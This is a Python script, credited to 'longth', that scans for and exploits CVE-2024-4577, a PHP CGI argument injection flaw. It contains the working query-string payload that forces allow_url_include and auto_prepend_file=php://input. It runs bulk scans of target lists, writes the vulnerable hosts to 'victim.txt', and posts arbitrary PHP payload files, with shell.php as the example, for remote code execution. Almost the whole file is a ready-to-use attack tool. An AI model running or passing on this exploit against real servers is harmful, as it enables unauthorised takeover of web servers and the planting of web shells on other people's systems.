import argparse
import requests
from colorama import init
from rich.console import Console
from rich.table import Table
from rich.progress import Progress, SpinnerColumn, TextColumn
import re

# Initialize colorama
init(autoreset=True)

# Initialize rich Console for better output
console = Console()

def scan_for_vulnerability(target_url):
    """Scanning for RCE CVE-2024-4577 PHP CGI Argument Injection vulnerability"""
    try:
        payload = "?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input"
        url = f"{target_url}/{payload}"
        
        # Send a POST request payload to detect vulnerability
        response = requests.post(url, data="echo 'Test'; die;", timeout=5)  # Adjust timeout as needed
        
        if 'Test' in response.text:
            return True
        else:
            return False
    except requests.exceptions.RequestException:
        return False

def exploit(target_url, payload_file):
    """Exploiting CVE-2024-4577"""
    try:
        payload = "?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input"
        url = f"{target_url}/{payload}" 
        
        with open(payload_file, 'r') as file:
            php_payload = file.read()
        
        # Send a POST request with the provided PHP code
        response = requests.post(url, data=php_payload, timeout=5)  # Adjust timeout as needed 
        
        if response.status_code == 200:
            console.print(f'[green][+] Exploit successful![/green]')
        else:
            console.print(f'[red][!] Exploit may have failed.[/red]')
    except requests.exceptions.RequestException as e:
        console.print(f"[red]Error: {e}[/red]")

def add_protocol(target):
    """Automatically prepend http or https if missing"""
    if not re.match(r'http[s]?://', target):
        return f"http://{target}"
    return target

if __name__ == "__main__":
    # Create a Rich-styled banner
    banner = """[bold cyan]

┏┓┓┏┏┓  ┏┓┏┓┏┓┏┓  ┏┓┏━━┓━┓
┃ ┃┃┣ ━━┏┛┃┫┏┛┃┃━━┃┃┗┓ ┃ ┃
┗┛┗┛┗┛  ┗━┗┛┗━┗╋  ┗╋┗┛ ╹ ╹
  
        Author By : longth
    [/bold cyan]"""
    
    console.print(banner)
    
    parser = argparse.ArgumentParser(description="RCE: PHP CGI Argument Injection Scanner and Exploit",
                                     epilog="[cyan]Example: python3 CVE-2024-4577.py -t targets.txt -e -p shell.php[/cyan]")
    parser.add_argument('-t', '--target', dest='target_file', help='File containing target URLs (e.g., targets.txt)', required=True)
    parser.add_argument('-s', '--scan', action='store_true', help='Scan for the vulnerability only')
    parser.add_argument('-e', '--exploit', action='store_true', help='Exploit the vulnerability after scanning')
    parser.add_argument('-p', '--payload', dest='payload_file', help='PHP payload file to execute (e.g., shell.php)')
  
    args = parser.parse_args()

    if not any([args.target_file]):
        parser.error('Please provide a file containing target URLs (--target)')

    targets = []
    with open(args.target_file, 'r') as file:
        for line in file:
            target = line.strip()
            if target:
                # Add protocol if missing
                target_with_protocol = add_protocol(target)
                targets.append(target_with_protocol)

    # Open the victim.txt file in append mode
    with open('victim.txt', 'a') as victim_file:
        # Using rich Progress spinner to show scanning progress
        with Progress(SpinnerColumn(), TextColumn("[progress.description]{task.description}")) as progress:
            for target in targets:
                task = progress.add_task(f"[cyan]Scanning {target} for vulnerability...[/cyan]")
                if args.scan:
                    if scan_for_vulnerability(target):
                        console.print(f"[green][+] Target {target} is vulnerable to CVE-2024-4577[/green]")
                        # Write the vulnerable target to victim.txt
                        victim_file.write(f"{target}\n")
                    else:
                        console.print(f"[yellow][-] Target {target} is not vulnerable to CVE-2024-4577[/yellow]")
                    progress.remove_task(task)
                
                if args.exploit and args.payload_file:
                    exploit(target, args.payload_file)
                elif args.exploit:
                    console.print("[red][-] Please provide PHP payload to execute using the --payload option")
